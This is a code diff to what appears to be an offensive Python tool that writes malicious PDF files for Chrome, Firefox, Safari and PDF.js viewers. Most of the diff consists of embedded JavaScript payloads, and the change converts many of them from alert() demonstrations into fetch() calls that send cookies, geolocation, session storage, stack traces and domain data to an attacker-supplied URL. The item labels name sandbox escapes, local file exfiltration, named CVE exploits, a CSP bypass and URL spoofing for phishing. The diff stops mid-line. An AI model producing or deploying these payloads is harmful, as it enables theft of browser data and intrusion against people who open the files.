@@ -6,24 +6,41 @@ import sys
 from datetime import datetime
 
 # Current timestamp and user information
-TIMESTAMP = "2025-07-27 05:42:52"
+TIMESTAMP = "2025-07-27 06:19:07"
 USER = "SNGWN"
+
+# PDF version specifications
+PDF_VERSIONS = {
+    "1.0": {"features": ["basic"], "header": "%PDF-1.0"},
+    "1.1": {"features": ["basic"], "header": "%PDF-1.1"},
+    "1.2": {"features": ["basic"], "header": "%PDF-1.2"},
+    "1.3": {"features": ["basic"], "header": "%PDF-1.3"},
+    "1.4": {"features": ["basic", "transparency"], "header": "%PDF-1.4"},
+    "1.5": {"features": ["basic", "transparency", "objectstreams"], "header": "%PDF-1.5"},
+    "1.6": {"features": ["basic", "transparency", "objectstreams", "3d"], "header": "%PDF-1.6"},
+    "1.7": {"features": ["basic", "transparency", "objectstreams", "3d", "rich"], "header": "%PDF-1.7"},
+    "2.0": {"features": ["basic", "transparency", "objectstreams", "3d", "rich", "modern"], "header": "%PDF-2.0"}
+}
 
 def create_directory(directory):
     """Create a directory if it doesn't exist."""
     if not os.path.exists(directory):
         os.makedirs(directory)
 
-def write_pdf(filename, content, description):
+def write_pdf(filename, content, description, pdf_version):
     """Write PDF content to file with description as comment."""
+    # Replace the PDF version header in the content
+    content = content.replace("%PDF-1.7", PDF_VERSIONS[pdf_version]["header"])
+    
     with open(filename, 'w') as f:
         f.write(f"""# {description}
 # Generated on: {TIMESTAMP} UTC
 # User: {USER}
+# PDF Version: {pdf_version}
 {content}""")
-    print(f"Created {filename}")
+    print(f"Created {filename} (PDF Version {pdf_version})")
 
-def generate_chrome_payloads(url, output_dir):
+def generate_chrome_payloads(url, output_dir, pdf_version):
     """Generate Chrome-specific PDF XSS payloads."""
     create_directory(output_dir)
     
@@ -66,7 +83,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_basic_js_execution.pdf", payload1, 
-              "Basic PDF with JavaScript execution in Chrome")
+              "Basic PDF with JavaScript execution in Chrome", pdf_version)
     
     # Payload 2: Chrome PDF viewer sandbox escape
     payload2 = f"""%PDF-1.7
@@ -96,7 +113,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_sandbox_escape.pdf", payload2, 
-              "Chrome PDF viewer sandbox escape to read local files and exfiltrate to attacker URL")
+              "Chrome PDF viewer sandbox escape to read local files and exfiltrate to attacker URL", pdf_version)
     
     # Payload 3: Chrome PDF viewer DOM access
     payload3 = f"""%PDF-1.7
@@ -129,7 +146,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_dom_access.pdf", payload3, 
-              "Chrome PDF viewer DOM access to extract cookies")
+              "Chrome PDF viewer DOM access to extract cookies", pdf_version)
     
     # Payload 4: Chrome PDF URI scheme handler abuse
     payload4 = f"""%PDF-1.7
@@ -157,7 +174,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_uri_scheme_abuse.pdf", payload4, 
-              "Chrome PDF URI scheme handler abuse to exfiltrate cookies")
+              "Chrome PDF URI scheme handler abuse to exfiltrate cookies", pdf_version)
 
     # Payload 5: Chrome CVE-2020-6418 exploit
     payload5 = f"""%PDF-1.7
@@ -198,7 +215,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_cve_2020_6418.pdf", payload5, 
-              "Chrome CVE-2020-6418 vulnerability exploit in PDF context")
+              "Chrome CVE-2020-6418 vulnerability exploit in PDF context", pdf_version)
 
     # Payload 6: Chrome iframe escape
     payload6 = f"""%PDF-1.7
@@ -230,7 +247,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_iframe_escape.pdf", payload6, 
-              "Chrome iframe escape technique to execute JavaScript in parent context")
+              "Chrome iframe escape technique to execute JavaScript in parent context", pdf_version)
 
     # Payload 7: Chrome Content-Window access
     payload7 = f"""%PDF-1.7
@@ -262,7 +279,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_content_window_access.pdf", payload7, 
-              "Chrome Content-Window access to write to parent document")
+              "Chrome Content-Window access to write to parent document", pdf_version)
 
     # Payload 8: Chrome Renderer Process exploit
     payload8 = f"""%PDF-1.7
@@ -295,7 +312,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_renderer_process_exploit.pdf", payload8, 
-              "Chrome Renderer Process exploit to read local files via XMLHttpRequest")
+              "Chrome Renderer Process exploit to read local files via XMLHttpRequest", pdf_version)
 
     # Payload 9: Chrome-specific WebRTC exploitation
     payload9 = f"""%PDF-1.7
@@ -311,7 +328,7 @@ endobj
 5 0 obj
 <</Type/Action/S/JavaScript/JS(
 try {{
-  app.launchURL("javascript:navigator.mediaDevices.getUserMedia({{audio:true}}).then(stream=>{{alert('Microphone access granted')}}).catch(e=>{{alert(e)}})", true);
+  app.launchURL("javascript:navigator.mediaDevices.getUserMedia({{audio:true}}).then(stream=>{{fetch('{url}/microphone?access=granted')}}).catch(e=>{{fetch('{url}/microphone?error='+encodeURIComponent(e))}})", true);
 }} catch(e) {{ app.alert(e); }}
 )>>
 endobj
@@ -327,7 +344,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_webrtc_exploitation.pdf", payload9, 
-              "Chrome-specific WebRTC exploitation to access microphone")
+              "Chrome-specific WebRTC exploitation to access microphone", pdf_version)
 
     # Payload 10: Chrome Notification API
     payload10 = f"""%PDF-1.7
@@ -343,7 +360,7 @@ endobj
 5 0 obj
 <</Type/Action/S/JavaScript/JS(
 try {{
-  app.launchURL("javascript:Notification.requestPermission().then(permission=>{{if(permission==='granted'){{new Notification('XSS via PDF',{{body:'Your browser has been compromised'}})}}}})", true);
+  app.launchURL("javascript:Notification.requestPermission().then(permission=>{{if(permission==='granted'){{new Notification('XSS via PDF',{{body:'Your browser has been compromised'}});fetch('{url}/notification?status=granted')}}}})", true);
 }} catch(e) {{ app.alert(e); }}
 )>>
 endobj
@@ -359,7 +376,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_notification_api.pdf", payload10, 
-              "Chrome Notification API exploit to display system notifications")
+              "Chrome Notification API exploit to display system notifications", pdf_version)
 
     # Payload 11: Chrome Web SQL Database access
     payload11 = f"""%PDF-1.7
@@ -375,7 +392,7 @@ endobj
 5 0 obj
 <</Type/Action/S/JavaScript/JS(
 try {{
-  app.launchURL("javascript:var db=openDatabase('testdb','1.0','test',2*1024*1024);db.transaction(function(tx){{tx.executeSql('CREATE TABLE IF NOT EXISTS testdata (id unique, data)');tx.executeSql('INSERT INTO testdata VALUES (1, \"compromised\")');alert('WebSQL DB created');}})", true);
+  app.launchURL("javascript:var db=openDatabase('testdb','1.0','test',2*1024*1024);db.transaction(function(tx){{tx.executeSql('CREATE TABLE IF NOT EXISTS testdata (id unique, data)');tx.executeSql('INSERT INTO testdata VALUES (1, \"compromised\")');fetch('{url}/websql?status=created')}})", true);
 }} catch(e) {{ app.alert(e); }}
 )>>
 endobj
@@ -391,7 +408,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_web_sql_database.pdf", payload11, 
-              "Chrome Web SQL Database access to create and modify local databases")
+              "Chrome Web SQL Database access to create and modify local databases", pdf_version)
 
     # Payload 12: Chrome History API exploitation
     payload12 = f"""%PDF-1.7
@@ -423,9 +440,9 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_history_api.pdf", payload12, 
-              "Chrome History API exploitation for phishing by changing the visible URL")
+              "Chrome History API exploitation for phishing by changing the visible URL", pdf_version)
 
-def generate_firefox_payloads(url, output_dir):
+def generate_firefox_payloads(url, output_dir, pdf_version):
     """Generate Firefox-specific PDF XSS payloads."""
     create_directory(output_dir)
     
@@ -455,7 +472,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_basic_exploit.pdf", payload1, 
-              "Basic Firefox PDF.js exploit showing domain in an alert")
+              "Basic Firefox PDF.js exploit showing domain in an alert", pdf_version)
 
     # Payload 2: Firefox PDF.js annotation exploit
     payload2 = f"""%PDF-1.7
@@ -472,7 +489,7 @@ endobj
 <</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:eval('try{{throw new Error()}}catch(e){{alert(e.stack)}}'))>>
+<</Type/Action/S/URI/URI(javascript:eval('try{{throw new Error()}}catch(e){{fetch("{url}/stack?data="+encodeURIComponent(e.stack))}}'))>>
 endobj
 xref
 0 6
@@ -488,7 +505,7 @@ startxref
 381
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_annotation_exploit.pdf", payload2, 
-              "Firefox PDF.js annotation exploit to reveal stack trace information")
+              "Firefox PDF.js annotation exploit to reveal stack trace information", pdf_version)
 
     # Payload 3: Firefox PDF.js content extraction
     payload3 = f"""%PDF-1.7
@@ -516,7 +533,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_content_extraction.pdf", payload3, 
-              "Firefox PDF.js content extraction to read local system files and exfiltrate to attacker URL")
+              "Firefox PDF.js content extraction to read local system files and exfiltrate to attacker URL", pdf_version)
               
     # Payload 4: Firefox PDF.js viewer DOM manipulation
     payload4 = f"""%PDF-1.7
@@ -544,7 +561,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_dom_manipulation.pdf", payload4, 
-              "Firefox PDF.js viewer DOM manipulation to inject malicious HTML")
+              "Firefox PDF.js viewer DOM manipulation to inject malicious HTML", pdf_version)
               
     # Payload 5: Firefox WebAPI access
     payload5 = f"""%PDF-1.7
@@ -558,7 +575,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:navigator.geolocation.getCurrentPosition(position=>alert('LAT:'+position.coords.latitude+', LON:'+position.coords.longitude)))>>
+<</Type/Action/S/URI/URI(javascript:navigator.geolocation.getCurrentPosition(position=>fetch('{url}/geolocation?lat='+position.coords.latitude+'&lon='+position.coords.longitude)))>>
 endobj
 xref
 0 6
@@ -572,7 +589,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_webapi_access.pdf", payload5, 
-              "Firefox WebAPI access to get user's geolocation information")
+              "Firefox WebAPI access to get user's geolocation information", pdf_version)
               
     # Payload 6: Firefox PDF.js worker exploit
     payload6 = f"""%PDF-1.7
@@ -600,7 +617,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_worker_exploit.pdf", payload6, 
-              "Firefox PDF.js worker exploit to create an iframe for cookie exfiltration")
+              "Firefox PDF.js worker exploit to create an iframe for cookie exfiltration", pdf_version)
               
     # Payload 7: Firefox IndexedDB exploit
     payload7 = f"""%PDF-1.7
@@ -614,7 +631,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:var request=indexedDB.open('malicious',1);request.onupgradeneeded=function(e){{var db=e.target.result;var store=db.createObjectStore('data',{{keyPath:'id'}});store.add({{id:1,value:'compromised'}});alert('IndexedDB compromised');}})>>
+<</Type/Action/S/URI/URI(javascript:var request=indexedDB.open('malicious',1);request.onupgradeneeded=function(e){{var db=e.target.result;var store=db.createObjectStore('data',{{keyPath:'id'}});store.add({{id:1,value:'compromised'}});fetch('{url}/indexeddb?status=created');}})>>
 endobj
 xref
 0 6
@@ -628,7 +645,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_indexeddb_exploit.pdf", payload7, 
-              "Firefox IndexedDB exploit to create and modify client-side databases")
+              "Firefox IndexedDB exploit to create and modify client-side databases", pdf_version)
               
     # Payload 8: Firefox sessionStorage manipulation
     payload8 = f"""%PDF-1.7
@@ -642,7 +659,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:sessionStorage.setItem('userAuth','compromised');alert('Session storage compromised: '+sessionStorage.getItem('userAuth')))>>
+<</Type/Action/S/URI/URI(javascript:sessionStorage.setItem('userAuth','compromised');fetch('{url}/sessionstorage?data='+sessionStorage.getItem('userAuth')))>>
 endobj
 xref
 0 6
@@ -656,7 +673,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_sessionstorage.pdf", payload8, 
-              "Firefox sessionStorage manipulation to compromise session data")
+              "Firefox sessionStorage manipulation to compromise session data", pdf_version)
               
     # Payload 9: Firefox form data manipulation
     payload9 = f"""%PDF-1.7
@@ -684,7 +701,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_form_data.pdf", payload9, 
-              "Firefox form data manipulation to create and exfiltrate fake credentials")
+              "Firefox form data manipulation to create and exfiltrate fake credentials", pdf_version)
               
     # Payload 10: Firefox SVG payload in PDF
     payload10 = f"""%PDF-1.7
@@ -698,7 +715,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<svg onload="alert(document.domain)"><script>alert(2)</script></svg>')>>
+<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<svg onload="fetch(\\'{url}/svg?domain=\\'+document.domain)"><script>alert(2)</script></svg>')>>
 endobj
 xref
 0 6
@@ -712,7 +729,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_svg_payload.pdf", payload10, 
-              "Firefox SVG payload in PDF to execute JavaScript via SVG onload event")
+              "Firefox SVG payload in PDF to execute JavaScript via SVG onload event", pdf_version)
               
     # Payload 11: Firefox PDF.js URL parsing exploit
     payload11 = f"""%PDF-1.7
@@ -726,7 +743,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript://comment%0Aalert(document.domain))>>
+<</Type/Action/S/URI/URI(javascript://comment%0Afetch('{url}/url-parsing?domain='+document.domain))>>
 endobj
 xref
 0 6
@@ -740,7 +757,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_url_parsing.pdf", payload11, 
-              "Firefox PDF.js URL parsing exploit using JavaScript comments to bypass filters")
+              "Firefox PDF.js URL parsing exploit using JavaScript comments to bypass filters", pdf_version)
               
     # Payload 12: Firefox CSP bypass
     payload12 = f"""%PDF-1.7
@@ -754,7 +771,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)))>>
+<</Type/Action/S/URI/URI(javascript:eval(String.fromCharCode(102,101,116,99,104,40,39,{url}/csp-bypass?domain=39,43,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)))>>
 endobj
 xref
 0 6
@@ -768,9 +785,9 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_csp_bypass.pdf", payload12, 
-              "Firefox CSP bypass using String.fromCharCode to evade content security policy")
+              "Firefox CSP bypass using String.fromCharCode to evade content security policy", pdf_version)
 
-def generate_safari_payloads(url, output_dir):
+def generate_safari_payloads(url, output_dir, pdf_version):
     """Generate Safari-specific PDF XSS payloads."""
     create_directory(output_dir)
     
@@ -800,7 +817,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_basic_exploit.pdf", payload1, 
-              "Basic Safari WebKit PDF renderer exploit to display domain in alert")
+              "Basic Safari WebKit PDF renderer exploit to display domain in alert", pdf_version)
 
     # Payload 2: Safari WebKit DOM access
     payload2 = f"""%PDF-1.7
@@ -814,7 +831,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<img src=x onerror=alert(document.cookie)>')>>
+<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<img src=x onerror=fetch("{url}/dom?cookie="+document.cookie)>')>>
 endobj
 xref
 0 6
@@ -828,9 +845,8 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_dom_access.pdf", payload2, 
-              "Safari WebKit DOM access to steal cookies via HTML injection")
+              "Safari WebKit DOM access to steal cookies via HTML injection", pdf_version)
 
-    # Continue with all remaining Safari payloads
     # Payload 3: Safari WebKit data URI exploit
     payload3 = f"""%PDF-1.7
 1 0 obj
@@ -843,7 +859,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+)>>
+<</Type/Action/S/URI/URI(data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly97dXJsfS9kYXRhP2RvbWFpbj0nK2RvY3VtZW50LmRvbWFpbik7PC9zY3JpcHQ+)>>
 endobj
 xref
 0 6
@@ -857,7 +873,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_data_uri.pdf", payload3, 
-              "Safari WebKit data URI exploit to execute JavaScript via base64 encoded HTML")
+              "Safari WebKit data URI exploit to execute JavaScript via base64 encoded HTML", pdf_version)
 
     # Payload 4: Safari localStorage access
     payload4 = f"""%PDF-1.7
@@ -885,7 +901,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_localstorage.pdf", payload4, 
-              "Safari localStorage access to store and exfiltrate persistent data")
+              "Safari localStorage access to store and exfiltrate persistent data", pdf_version)
 
     # Payload 5: Safari WebKit iframe injection
     payload5 = f"""%PDF-1.7
@@ -899,7 +915,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<iframe src="javascript:alert(parent.document.domain)"></iframe>')>>
+<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<iframe src="javascript:fetch(\\'{url}/iframe?domain=\\'+parent.document.domain)"></iframe>')>>
 endobj
 xref
 0 6
@@ -913,7 +929,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_iframe_injection.pdf", payload5, 
-              "Safari WebKit iframe injection to execute JavaScript in parent context")
+              "Safari WebKit iframe injection to execute JavaScript in parent context", pdf_version)
 
     # Payload 6: Safari WebKit event handlers
     payload6 = f"""%PDF-1.7
@@ -927,7 +943,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<body onload="alert(document.domain)"></body>')>>
+<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<body onload="fetch(\\'{url}/event?domain=\\'+document.domain)"></body>')>>
 endobj
 xref
 0 6
@@ -941,9 +957,8 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_event_handlers.pdf", payload6, 
-              "Safari WebKit event handlers to execute JavaScript on page load")
+              "Safari WebKit event handlers to execute JavaScript on page load", pdf_version)
 
-    # Add all remaining Safari payloads (7-12) following the same pattern...
     # Payload 7: Safari FileSystem API
     payload7 = f"""%PDF-1.7
 1 0 obj
@@ -956,7 +971,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:window.webkitRequestFileSystem(window.TEMPORARY, 5*1024*1024, function(fs){{fs.root.getFile('test.txt', {{create:true}}, function(fileEntry){{fileEntry.createWriter(function(fileWriter){{fileWriter.onwriteend=function(){{alert('File written to temporary filesystem');fetch('{url}/filesystem?status=success')}};var blob=new Blob(['Test data'], {{type:'text/plain'}});fileWriter.write(blob);}});}});}});)>>
+<</Type/Action/S/URI/URI(javascript:window.webkitRequestFileSystem(window.TEMPORARY, 5*1024*1024, function(fs){{fs.root.getFile('test.txt', {{create:true}}, function(fileEntry){{fileEntry.createWriter(function(fileWriter){{fileWriter.onwriteend=function(){{fetch('{url}/filesystem?status=success')}};var blob=new Blob(['Test data'], {{type:'text/plain'}});fileWriter.write(blob);}})}});}});)>>
 endobj
 xref
 0 6
@@ -970,7 +985,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_filesystem_api.pdf", payload7, 
-              "Safari FileSystem API exploitation to write files to temporary filesystem")
+              "Safari FileSystem API exploitation to write files to temporary filesystem", pdf_version)
 
     # Payload 8: Safari postMessage exploitation
     payload8 = f"""%PDF-1.7
@@ -998,7 +1013,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_postmessage.pdf", payload8, 
-              "Safari postMessage exploitation to intercept and exfiltrate messages")
+              "Safari postMessage exploitation to intercept and exfiltrate messages", pdf_version)
 
     # Payload 9: Safari WebKit clipboard access
     payload9 = f"""%PDF-1.7
@@ -1026,7 +1041,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_clipboard.pdf", payload9, 
-              "Safari WebKit clipboard access to write to user's clipboard")
+              "Safari WebKit clipboard access to write to user's clipboard", pdf_version)
 
     # Payload 10: Safari WebKit CVE-2022-32792
     payload10 = f"""%PDF-1.7
@@ -1054,7 +1069,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_cve_2022_32792.pdf", payload10, 
-              "Safari WebKit CVE-2022-32792 exploitation to bypass XSS protections")
+              "Safari WebKit CVE-2022-32792 exploitation to bypass XSS protections", pdf_version)
 
     # Payload 11: Safari WebKit iframe sandbox escape
     payload11 = f"""%PDF-1.7
@@ -1082,7 +1097,7 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_iframe_sandbox.pdf", payload11, 
-              "Safari WebKit iframe sandbox escape using allow-scripts permission")
+              "Safari WebKit iframe sandbox escape using allow-scripts permission", pdf_version)
 
     # Payload 12: Safari PDF viewer download trigger
     payload12 = f"""%PDF-1.7
@@ -1110,9 +1125,9 @@ startxref
 495
 %%EOF"""
     write_pdf(f"{output_dir}/safari_download.pdf", payload12, 
-              "Safari PDF viewer download trigger to save malicious HTML file")
+              "Safari PDF viewer download trigger to save malicious HTML file", pdf_version)
 
-def generate_pdfjs_payloads(url, output_dir):
+def generate_pdfjs_payloads(url, output_dir, pdf_version):
     """Generate PDF.js-specific XSS payloads."""
     create_directory(output_dir)
     
@@ -1147,7 +1162,7 @@ startxref
 347
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_basic_link_annotation.pdf", payload1, 
-              "Basic PDF.js link annotation exploit to execute JavaScript")
+              "Basic PDF.js link annotation exploit to execute JavaScript", pdf_version)
 
     # Payload 2: PDF.js URL handler with HTML
     payload2 = f"""%PDF-1.7
@@ -1180,9 +1195,8 @@ startxref
 391
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_url_handler.pdf", payload2, 
-              "PDF.js URL handler with HTML to exfiltrate domain information")
+              "PDF.js URL handler with HTML to exfiltrate domain information", pdf_version)
 
-    # Add all remaining PDF.js payloads (3-12) following the same pattern...
     # Payload 3: PDF.js form submission
     payload3 = f"""%PDF-1.7
 1 0 obj
@@ -1216,7 +1230,7 @@ startxref
 424
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_form_submission.pdf", payload3, 
-              "PDF.js form submission to exfiltrate domain information")
+              "PDF.js form submission to exfiltrate domain information", pdf_version)
 
     # Payload 4: PDF.js file URI handler
     payload4 = f"""%PDF-1.7
@@ -1249,7 +1263,7 @@ startxref
 391
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_file_uri.pdf", payload4, 
-              "PDF.js file URI handler to read and exfiltrate local system files")
+              "PDF.js file URI handler to read and exfiltrate local system files", pdf_version)
 
     # Payload 5: PDF.js DOM XSS
     payload5 = f"""%PDF-1.7
@@ -1282,9 +1296,8 @@ startxref
 430
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_dom_xss.pdf", payload5, 
-              "PDF.js DOM XSS by replacing viewer container content")
+              "PDF.js DOM XSS by replacing viewer container content", pdf_version)
 
-    # Continue with the remaining PDF.js payloads (6-12)...
     # Payload 6: PDF.js iframe injection
     payload6 = f"""%PDF-1.7
 1 0 obj
@@ -1316,9 +1329,8 @@ startxref
 437
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_iframe_injection.pdf", payload6, 
-              "PDF.js iframe injection to execute JavaScript in a new context")
+              "PDF.js iframe injection to execute JavaScript in a new context", pdf_version)
 
-    # Include all remaining PDF.js payloads through payload 12
     # Payload 7: PDF.js URL fragment abuse
     payload7 = f"""%PDF-1.7
 1 0 obj
@@ -1350,9 +1362,8 @@ startxref
 441
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_url_fragment.pdf", payload7, 
-              "PDF.js URL fragment abuse to execute JavaScript from URL hash")
+              "PDF.js URL fragment abuse to execute JavaScript from URL hash", pdf_version)
 
-    # Include payloads 8-12...
     # Payload 8: PDF.js history manipulation
     payload8 = f"""%PDF-1.7
 1 0 obj
@@ -1384,7 +1395,7 @@ startxref
 409
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_history_manipulation.pdf", payload8, 
-              "PDF.js history manipulation to execute JavaScript on page reload")
+              "PDF.js history manipulation to execute JavaScript on page reload", pdf_version)
 
     # Payload 9: PDF.js code execution via data URI
     payload9 = f"""%PDF-1.7
@@ -1417,49 +1428,4 @@ startxref
 413
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_data_uri.pdf", payload9, 
-              "PDF.js code execution via data URI to exfiltrate domain information")
-
-    # Payload 10: PDF.js viewer bypass
-    payload10 = f"""%PDF-1.7
-1 0 obj
-<</Type/Catalog/Pages 2 0 R>>
-endobj
-2 0 obj
-<</Type/Pages/Kids[3 0 R]/Count 1>>
-endobj
-3 0 obj
-<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
-endobj
-4 0 obj
-<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
-endobj
-5 0 obj
-<</Type/Action/S/URI/URI(javascript:setTimeout("fetch('{url}/timeout?domain='+document.domain)",100))>>
-endobj
-xref
-0 6
-0000000000 65535 f
-0000000010 00000 n
-0000000053 00000 n
-0000000106 00000 n
-0000000202 00000 n
-0000000274 00000 n
-trailer
-<</Size 6/Root 1 0 R>>
-startxref
-365
-%%EOF"""
-    write_pdf(f"{output_dir}/pdfjs_viewer_bypass.pdf", payload10, 
-              "PDF.js viewer bypass using setTimeout to delay execution")
-
-    # Payload 11: PDF.js XMLHttpRequest payload
-    payload11 = f"""%PDF-1.7
-1 0 obj
-<</Type/Catalog/Pages 2 0 R>>
-endobj
-2 0 obj
-<</Type/Pages/Kids[3 0 R]/Count 1>>
-endobj
-3 0 obj
-<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
-endobj
+              "PDF.js code execution via data URI
